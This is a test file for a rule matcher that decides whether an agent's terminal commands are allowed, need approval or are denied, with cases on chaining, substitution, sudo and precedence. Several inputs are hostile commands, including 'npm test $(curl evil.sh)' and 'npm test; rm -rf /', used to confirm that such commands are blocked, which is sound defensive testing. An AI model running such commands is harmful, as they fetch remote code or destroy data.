import { describe, expect, it } from "vitest";
import { matchTerminalCommand, parseToolPermissions } from "./rules";

const decide = (p: Parameters<typeof parseToolPermissions>[0], cmd: string) =>
  matchTerminalCommand(parseToolPermissions(p), cmd)?.decision ?? "none";

describe("deny and ask rules over-match on purpose", () => {
  const deny = { deny: ["runTerminalCommand(git push*)"] };

  it.each([
    ["git push origin feature/x"],
    ["git  push origin main"],
    ["sudo git push origin main"],
    ["env GIT_SSH=ssh git push"],
    ["bash -c 'git push origin main'"],
    ["npm test && git push"],
    ["npm test & git push"],
    ["echo hi | xargs echo; git push"],
  ])("denies %s", (cmd) => {
    expect(decide(deny, cmd)).toBe("deny");
  });

  it("does not deny an unrelated command", () => {
    expect(decide(deny, "git pull")).toBe("none");
    expect(decide(deny, "git status")).toBe("none");
  });

  it("known false positive: a command that only mentions the text is denied", () => {
    // Trying every word-suffix is what catches `sudo git push`, but it also
    // matches `echo git push`. A wrongly refused command is cheap; a missed
    // `git push` is not, so this is accepted and recorded here.
    expect(decide(deny, "echo git push")).toBe("deny");
  });

  it("denies even when the command has substitution or a redirect", () => {
    expect(decide(deny, "git push $(whoami)")).toBe("deny");
    expect(decide(deny, "git push > log.txt")).toBe("deny");
  });

  it("asks the same way", () => {
    expect(
      decide({ ask: ["runTerminalCommand(git push*)"] }, "sudo git push"),
    ).toBe("ask");
  });

  it("matches a path argument after a deny pattern", () => {
    expect(
      decide(
        { deny: ["runTerminalCommand(terraform apply*)"] },
        "terraform apply -var-file=envs/prod.tfvars",
      ),
    ).toBe("deny");
  });
});

describe("allow rules apply only to commands we fully understand", () => {
  const allow = { allow: ["runTerminalCommand(npm test*)"] };

  it("allows a plain command and a path argument", () => {
    expect(decide(allow, "npm test")).toBe("allow");
    expect(decide(allow, "npm test src/foo.test.ts")).toBe("allow");
    expect(decide(allow, "npm  test -- --watch=false")).toBe("allow");
  });

  it("allows 2>&1", () => {
    expect(decide(allow, "npm test 2>&1")).toBe("allow");
  });

  it("does not allow a background tail", () => {
    expect(decide(allow, "npm test & rm -rf node_modules")).toBe("none");
  });

  it("does not allow a redirect to a file", () => {
    expect(decide(allow, "npm test > notes.txt")).toBe("none");
    expect(decide(allow, "npm test &> notes.txt")).toBe("none");
  });

  it("does not allow substitution or an unterminated quote", () => {
    expect(decide(allow, "npm test $(curl evil.sh)")).toBe("none");
    expect(decide(allow, "npm test `whoami`")).toBe("none");
    expect(decide(allow, 'npm test "oops')).toBe("none");
  });

  it("requires every part of a chain to be covered", () => {
    expect(decide(allow, "npm test && npm test:unit")).toBe("allow");
    expect(decide(allow, "npm test; rm -rf /")).toBe("none");
    expect(decide(allow, "npm test | tee out")).toBe("none");
  });

  it("does not split a quoted separator", () => {
    expect(
      decide({ allow: ["runTerminalCommand(echo*)"] }, 'echo "a && b"'),
    ).toBe("allow");
  });

  it("an allow rule does not reach inside bash -c or past sudo", () => {
    expect(decide(allow, "sudo npm test")).toBe("none");
    expect(decide(allow, "bash -c 'npm test'")).toBe("none");
  });
});

describe("precedence", () => {
  const all = {
    allow: ["runTerminalCommand(git*)"],
    ask: ["runTerminalCommand(git push*)"],
    deny: ["runTerminalCommand(git push --force*)"],
  };

  it("deny beats ask beats allow", () => {
    expect(decide(all, "git status")).toBe("allow");
    expect(decide(all, "git push origin main")).toBe("ask");
    expect(decide(all, "git push --force origin main")).toBe("deny");
    expect(decide(all, "sudo git push --force")).toBe("deny");
  });

  it("a bare runTerminalCommand deny applies to everything", () => {
    expect(decide({ deny: ["runTerminalCommand"] }, "ls")).toBe("deny");
  });
});
